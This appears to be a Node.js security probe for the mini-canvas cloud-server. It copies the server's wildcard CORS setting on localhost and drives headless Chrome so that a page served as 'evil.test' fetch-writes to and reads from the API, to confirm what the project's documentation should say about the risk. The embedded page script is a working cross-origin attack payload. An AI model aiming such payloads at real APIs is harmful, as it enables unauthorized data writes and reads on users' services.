/**
 * 探针 G：把目标换成「与 cloud-server 现状一致」的 cors()（默认 origin '*'），
 * 看公网页面能不能**读到**响应，而不只是发出副作用。
 *
 * 这决定文档第一节该写「网页能改数据」还是只写「网页能触发写操作」。
 */
import http from 'node:http'
import { spawn } from 'node:child_process'
import { mkdtempSync } from 'node:fs'
import os from 'node:os'
import path from 'node:path'
import { createRequire } from 'node:module'

const require = createRequire('D:/Code/Git/mini-canvas/packages/cloud-server/package.json')
const { Hono } = require('hono')
const { cors } = require('hono/cors')
const { serve } = require('@hono/node-server')

const CHROME = process.env.CHROME_EXE ??
  'C:/Users/Administrator/AppData/Local/ms-playwright/chromium-1243/chrome-win64/chrome.exe'

const seen = []

// 与 server.ts:445 完全一致：app.use('*', cors())
const app = new Hono()
app.use('*', cors())
app.post('/api/write', async (c) => {
  const body = await c.req.text()
  seen.push({ method: 'POST', path: '/api/write', body: body.slice(0, 40), origin: c.req.header('origin') ?? null })
  return c.json({ ok: true, secret: 'canvas-data-here' })
})
app.get('/api/read', (c) => c.json({ ok: true, secret: 'canvas-data-here' }))

const server = serve({ fetch: app.fetch, port: 0, hostname: '127.0.0.1' })
const targetPort = await new Promise((r) => server.once('listening', () => r(server.address().port)))

const evilHtml = `<!doctype html><meta charset="utf-8"><body><script>
  var API = 'http://127.0.0.1:${targetPort}';
  window.__out = [];
  window.__go = async function () {
    try {
      var r = await fetch(API + '/api/write', { method: 'POST', headers: { 'content-type': 'application/json' }, body: '{"evil":true}' });
      __out.push('写接口 status=' + r.status + ' 响应=' + (await r.text()));
    } catch (e) { __out.push('写接口被拦：' + e.message); }
    try {
      var r2 = await fetch(API + '/api/read');
      __out.push('读接口 status=' + r2.status + ' 响应=' + (await r2.text()));
    } catch (e) { __out.push('读接口被拦：' + e.message); }
    return __out;
  };
</script></body>`

const evil = http.createServer((req, res) => {
  res.writeHead(200, { 'content-type': 'text/html; charset=utf-8' })
  res.end(evilHtml)
})
await new Promise((r) => evil.listen(0, '0.0.0.0', r))
const evilPort = evil.address().port

const userDataDir = mkdtempSync(path.join(os.tmpdir(), 'mc-probe6-'))
const chrome = spawn(CHROME, [
  '--headless=new', '--remote-debugging-port=0', '--user-data-dir=' + userDataDir,
  '--no-first-run', '--no-default-browser-check', '--no-proxy-server', '--proxy-bypass-list=*',
  '--host-resolver-rules=MAP evil.test 127.0.0.1', 'about:blank',
], { stdio: ['ignore', 'pipe', 'pipe'] })

let stderr = ''
chrome.stderr.on('data', (d) => { stderr += String(d) })
const wsUrl = await new Promise((resolve, reject) => {
  const timer = setTimeout(() => reject(new Error('chrome 没启动：' + stderr.slice(-1500))), 20000)
  chrome.stderr.on('data', () => {
    const m = /DevTools listening on (ws:\/\/\S+)/.exec(stderr)
    if (m) { clearTimeout(timer); resolve(m[1]) }
  })
})
const dbgPort = new URL(wsUrl).port
const tgt = await (await fetch(`http://127.0.0.1:${dbgPort}/json/new?about:blank`, { method: 'PUT' })).json()
const ws = new WebSocket(tgt.webSocketDebuggerUrl)
await new Promise((r) => ws.addEventListener('open', r))

let id = 0
const pending = new Map()
ws.addEventListener('message', (ev) => {
  const msg = JSON.parse(String(ev.data))
  if (msg.id && pending.has(msg.id)) { pending.get(msg.id)(msg); pending.delete(msg.id) }
  if (msg.method === 'Log.entryAdded') console.log('[console]', msg.params?.entry?.text)
})
function send(method, params = {}) {
  const myId = ++id
  ws.send(JSON.stringify({ id: myId, method, params }))
  return new Promise((r) => pending.set(myId, r))
}

await send('Page.enable')
await send('Runtime.enable')
await send('Log.enable')
await send('Page.navigate', { url: `http://evil.test:${evilPort}/` })
await new Promise((r) => setTimeout(r, 1200))
const res = await send('Runtime.evaluate', { expression: 'window.__go()', awaitPromise: true, returnByValue: true })
console.log('=== 公网页面看到的结果 ===')
console.log(JSON.stringify(res.result?.result?.value ?? res.result, null, 2))
await new Promise((r) => setTimeout(r, 300))
console.log('=== 服务端实际收到的写请求 ===')
console.log(JSON.stringify(seen, null, 2))

ws.close(); chrome.kill(); evil.close(); server.close()
process.exit(0)
